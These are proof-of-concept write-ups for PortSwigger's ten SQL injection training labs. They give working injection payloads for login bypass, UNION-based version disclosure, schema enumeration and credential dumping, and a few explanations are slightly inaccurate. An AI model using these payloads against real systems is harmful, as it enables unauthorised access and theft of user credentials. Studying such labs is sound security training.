# SQL Injection Labs 01-10 — Proof of Concept Writeups

This document contains structured Proof of Concept (PoC) writeups for SQL Injection (SQLi) Labs 01 to 10 from the PortSwigger Web Security Academy.

---

## Lab 01 — SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

- **Difficulty:** Apprentice
- **Vulnerability Type:** SQL injection in product category filter
- **Goal:** Display all products, including unreleased ones.

### Proof of Concept (PoC)

1. Access the product filter page.
2. Modify the `category` GET parameter by appending a SQL injection payload that invalidates the `released = 1` condition.
3. Payload:
   ```http
   GET /filter?category=Gifts'+OR+1=1-- HTTP/2
   ```

### Why It Works

The application builds the query dynamically:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
By injecting `' OR 1=1--`, the query becomes:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
Since `1=1` is always true and the trailing `--` comments out the rest of the query, the database returns all rows from the `products` table, revealing unreleased products.

---

## Lab 02 — SQL injection vulnerability allowing login bypass

- **Difficulty:** Apprentice
- **Vulnerability Type:** SQL injection in Login page
- **Goal:** Log in as the administrator user.

### Proof of Concept (PoC)

1. Navigate to the login page.
2. Enter the administrator username with a SQL comment sequence in the username field.
3. Payload:
   ```
   Username: administrator'--
   Password: [Anything, e.g. 1234]
   ```
4. Submit the request.

### Why It Works

The backend performs a query to verify user credentials:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = '...'
```
The comment indicator `--` removes the password check segment of the WHERE clause, forcing the query to return the `administrator` record and successfully authenticating the session.

---

## Lab 03 — SQL injection attack, querying the database type and version on Oracle

- **Difficulty:** Practitioner
- **Vulnerability Type:** UNION-based SQLi (Oracle)
- **Goal:** Display the database version string.

### Proof of Concept (PoC)

1. Determine the number of columns returned (2 columns).
2. Oracle requires a `FROM` clause for every `SELECT` query (we use the built-in `dual` table).
3. Inject a UNION SELECT query to fetch version info from `v$version`.
4. Payload:
   ```http
   GET /filter?category=Gifts'+UNION+SELECT+BANNER,+NULL+FROM+v$version-- HTTP/2
   ```

### Why It Works

Oracle queries require a table source, so we select from `v$version` and specify the dummy table `dual` for testing column compatibility. Combining standard results with version rows displays the version string in the product list response.

---

## Lab 04 — SQL injection attack, querying the database type and version on MySQL and Microsoft

- **Difficulty:** Practitioner
- **Vulnerability Type:** UNION-based SQLi (MySQL / MSSQL)
- **Goal:** Display the database version string.

### Proof of Concept (PoC)

1. Determine the column count (2 columns).
2. Inject a UNION SELECT query utilizing the database version variable.
3. Payload (MySQL / MSSQL):
   ```http
   GET /filter?category=Gifts'+UNION+SELECT+@@version,NULL--+ HTTP/2
   ```

### Why It Works

The global variable `@@version` is retrieved and concatenated to the output query, listing the database server version in the first column. The trailing `+` or space acts as a comment separator for MySQL.

---

## Lab 05 — SQL injection attack, listing the database contents on non-Oracle databases

- **Difficulty:** Practitioner
- **Vulnerability Type:** UNION-based SQLi (Metadata / Schema Dumping)
- **Goal:** Retrieve the administrator credentials and log in.

### Proof of Concept (PoC)

1. **Find table name:** Retrieve all table names from `information_schema.tables`:
   ```http
   GET /filter?category=Gifts'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables-- HTTP/2
   ```
   *Result Table:* `users_xxrkth`

2. **Find column names:** Retrieve columns for the target table:
   ```http
   GET /filter?category=Gifts'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_xxrkth'-- HTTP/2
   ```
   *Result Columns:* `username_nbdnbz`, `password_cclvfj`

3. **Dump credentials:** Extract data from the columns:
   ```http
   GET /filter?category=Gifts'+UNION+SELECT+username_nbdnbz,+password_cclvfj+FROM+users_xxrkth-- HTTP/2
   ```
   *Retrieved Admin Credentials:* `administrator:jkk5k6gaxm0kgpx3cl4k`

4. Log in as `administrator` with the dumped password.

### Why It Works

By querying database metadata via `information_schema`, we identify custom/obfuscated tables and column names, permitting precise data exfiltration of credentials from the backend database.

---

## Lab 06 — SQL injection attack, listing the database contents on Oracle

- **Difficulty:** Practitioner
- **Vulnerability Type:** UNION-based SQLi (Oracle Schema Dumping)
- **Goal:** Retrieve administrator credentials and log in.

### Proof of Concept (PoC)

1. **Find table name:** Query Oracle's `all_tables` view:
   ```http
   GET /filter?category=Gifts'+UNION+SELECT+table_name,+NULL+FROM+all_tables-- HTTP/2
   ```
   *Result Table:* `USERS_DUIXMZ`

2. **Find column names:** Query column structures for our target table:
   ```http
   GET /filter?category=Gifts'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='USERS_DUIXMZ'-- HTTP/2
   ```
   *Result Columns:* `USERNAME_RAJAZG`, `PASSWORD_IEJLAT`

3. **Dump credentials:** Retrieve data from the columns:
   ```http
   GET /filter?category=Gifts'+UNION+SELECT+USERNAME_RAJAZG,+PASSWORD_IEJLAT+FROM+USERS_DUIXMZ-- HTTP/2
   ```
   *Retrieved Admin Credentials:* Extract the administrator credentials and log in.

### Why It Works

Oracle stores metadata in `all_tables` and `all_tab_columns` instead of `information_schema`. Standard Oracle syntax constraints require us to target these views to enumerate schema details.

---

## Lab 07 — SQL injection UNION attack, determining the number of columns returned by the query

- **Difficulty:** Practitioner
- **Vulnerability Type:** UNION-based SQLi (Column Enumeration)
- **Goal:** Determine columns count by injecting NULLs.

### Proof of Concept (PoC)

1. Test the number of columns by executing UNION queries with varying numbers of NULL values.
2. Payload:
   ```http
   GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL-- HTTP/2
   ```
3. A successful response confirms the backend query expects exactly 3 columns.

### Why It Works

A `UNION` query requires both statements to return the same number of columns with matching data types. Supplying `NULL` matches any data type, letting us safely enumerate columns without generating database conversion errors.

---

## Lab 08 — SQL injection UNION attack, finding a column containing text

- **Difficulty:** Practitioner
- **Vulnerability Type:** UNION-based SQLi (Data Type Identification)
- **Goal:** Identify a column that can hold string data.

### Proof of Concept (PoC)

1. Establish that the query returns 3 columns.
2. Systematically substitute one `NULL` value at a time with a string payload.
3. Payload:
   ```http
   GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL,'target_string'-- HTTP/2
   ```
4. If a 200 OK response is returned, the modified column supports string/text values.

### Why It Works

UNION operations require data type compatibility. Attempting to place a string inside a numeric column fails with an error (e.g. 500 error). Replacing columns with strings one-by-one identifies where text data can be successfully loaded.

---

## Lab 09 — SQL injection UNION attack, retrieving data from other tables

- **Difficulty:** Practitioner
- **Vulnerability Type:** UNION-based SQLi (Data Extraction)
- **Goal:** Retrieve credentials from the `users` table and log in.

### Proof of Concept (PoC)

1. Determine the query returns 2 columns, both supporting string values.
2. Execute a UNION SELECT referencing the standard `users` table.
3. Payload:
   ```http
   GET /filter?category=Gifts'+UNION+SELECT+username,+password+FROM+users-- HTTP/2
   ```
4. Retrieve the administrator password from the generated webpage output and log in.

### Why It Works

Since the application outputs database results directly to the client and both columns support strings, we can run a direct UNION query to overlay authentication database tables onto the standard product listing.

---

## Lab 10 — SQL injection UNION attack, retrieving multiple values in a single column

- **Difficulty:** Practitioner
- **Vulnerability Type:** UNION-based SQLi (String Concatenation)
- **Goal:** Retrieve multiple values (username/password) consolidated into one column.

### Proof of Concept (PoC)

1. Enumerate query structure (returns 2 columns, only 1 supports string values).
2. Concatenate the username and password values separated by a custom delimiter.
3. Payload (Oracle syntax):
   ```http
   GET /filter?category=Gifts'+UNION+SELECT+NULL,+username||'~'||password+FROM+users-- HTTP/2
   ```
4. Retrieve administrator credentials (e.g. `administrator~password`) and log in.

### Why It Works

When there is only one string column available in a query, we concatenate target credentials with a delimiter (e.g., `||` for Oracle) to extract username and password data together in a single row.
